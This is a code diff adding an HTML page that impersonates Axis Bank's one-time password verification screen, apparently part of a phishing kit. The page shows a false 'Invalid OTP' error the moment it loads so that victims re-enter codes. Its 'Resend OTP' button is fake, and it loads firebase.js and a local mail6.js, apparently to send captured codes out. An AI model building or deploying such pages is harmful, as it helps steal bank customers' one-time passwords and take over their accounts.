@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script src="loading.js"></script>
+    <title>Axis Bank</title>
+</head>
+<style>
+    .loader25 {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #f3f3f3;
+    z-index: 9999;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+.spinner25 {
+    width: 40px;
+    height: 40px;
+    border: 6px solid #8c0f45;
+    border-top: 6px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+.loader-text25 {
+    margin-top: 15px;
+    font-size: 14px;
+    color: #333;
+}
+.countdown25 {
+    margin-top: 10px;
+    font-size: 18px;
+    color: #333;
+}
+
+/* Spinner animation */
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
+
+</style>
+<body>
+<div id="loader25" class="loader25">
+        <div class="spinner25"></div>
+        <p class="loader-text25">Verifying details...</p>
+        <p id="countdown25" class="countdown25">00:10</p>
+    </div>
+<header>
+    <img src="assets/header.jpg" width="100%" alt="">
+</header>
+<main>
+    <h3 class="text-center">One Time Password (OTP) Verification</h3>
+    <div class="box">
+        <p style="color: grey;">One Time Password (OTP) has been sent to registered mobile number. Please enter the OTP and proceed.</p>
+        <input type="hidden" id="nextValue" value="loader.html?next?=tok.html">
+        <form id="otp4" class="form">
+            <strong id="tok-invalid" class="text-center"></strong>
+            <div class="form-group">
+                <label for="">One Time Password</label>
+                <input id="userotp" type="text" inputmode="numeric" minlength="6" maxlength="8" name="T" class="numericInput" required>
+                <span class="resend-otp-button" id="resendotp">Resend OTP</span>
+            </div>
+            <div class="form-group">
+                <div class="primary-color text-center">Wait for OTP: <span id="seconds">178</span> seconds</div>
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-primary">PROCEED</button>
+            </div>
+        </form>
+    </div>
+    <img src="assets/footer.jpg" alt="" width="100%">
+</main>
+
+<footer>
+    <img src="assets/cop.jpg" alt="" width="100%">
+</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+<script src="./mail6.js"></script>
+<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+<script src="script.js"></script>
+
+<script>
+    $(document).ready(function() {
+        // Initial setup for #tok-invalid
+        $('#tok-invalid').text('Invalid OTP').css('color', 'red');
+
+        // Countdown timer setup
+        var seconds = 178;
+        var countdown = setInterval(function() {
+            seconds--;
+            $('#seconds').text(seconds);
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                console.log('Countdown reached 0');
+            }
+        }, 1000);
+
+        // Resend OTP function
+        $('#resendotp').click(function() {
+            $('#tok-invalid').text('New OTP Sent Successfully').css('color', 'green');
+        });
+    });
+</script>
+</body>
+</html>
